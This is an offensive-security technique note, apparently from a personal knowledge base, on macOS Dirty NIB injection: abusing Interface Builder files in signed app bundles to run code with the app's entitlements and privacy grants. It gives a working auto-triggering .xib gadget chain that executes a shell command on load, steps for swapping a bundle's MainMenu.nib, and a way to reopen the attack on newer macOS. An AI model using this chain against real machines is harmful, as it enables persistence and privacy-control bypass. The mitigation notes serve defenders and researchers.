---
title: "macOS Dirty NIB Injection"
type: technique
tags: [macos, injection, persistence, tcc-bypass]
phase: post-exploitation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-macos]
---

## Dirty NIB injection

Abuse Interface Builder files (`.xib`/`.nib`) inside a signed app bundle to run attacker logic inside the target process, inheriting its entitlements and TCC grants (xpn, Sector7). NIB loading instantiates arbitrary Objective-C classes via `init`/`initWithFrame:` (no NSSecureCoding needed), and Cocoa Bindings can invoke selectors as the graph loads, so no user click is required. Pre-Ventura, replacing a bundle's `MainMenu.nib` after a one-time Gatekeeper assessment was a reliable injection/persistence primitive because later launches only did shallow signature checks.

Auto-trigger gadget chain inside a malicious `.xib`: instantiate `NSAppleScript` with the payload from an `NSTextField.title` via `initWithSource:`, then fire `executeAndReturnError:`, with the private `_corePerformAction` binding pressing each menu item at load:

```xml
<objects>
  <customObject id="A1" customClass="NSAppleScript"/>
  <textField id="A2" title="do shell script \"id > /tmp/nib\""/>
  <menuItem id="C1"><connections>
    <binding name="target" destination="A1"/>
    <binding name="selector" keyPath="initWithSource:"/>
    <binding name="Argument" destination="A2" keyPath="title"/></connections></menuItem>
  <menuItem id="C2"><connections>
    <binding name="target" destination="A1"/>
    <binding name="selector" keyPath="executeAndReturnError:"/></connections></menuItem>
  <menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
  <menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```

Deploy: copy `target.app` to a writable path, swap `Contents/Resources/MainMenu.nib`, relaunch. Enumerate targets and validate tamper:

```bash
# apps whose UI is nib-driven
/usr/libexec/PlistBuddy -c "Print :NSMainNibFile" /Applications/App.app/Contents/Info.plist
find target.app -type f \( -name "*.nib" -o -name "*.xib" \)
codesign --verify --deep --strict --verbose=4 target.app   # fails if resources tampered and not re-signed
```

Modern gating (Ventura+): first-launch deep verification then bundle protection (only same-Team-ID or an app with the new TCC "App Management" permission may write into another bundle), plus Launch Constraints blocking copy-and-run of Apple apps (see [[macos-launch-constraints]]). Practical reopener: any terminal granted App Management or Full Disk Access re-enables the attack surface for code it runs (see [[macos-tcc]]).
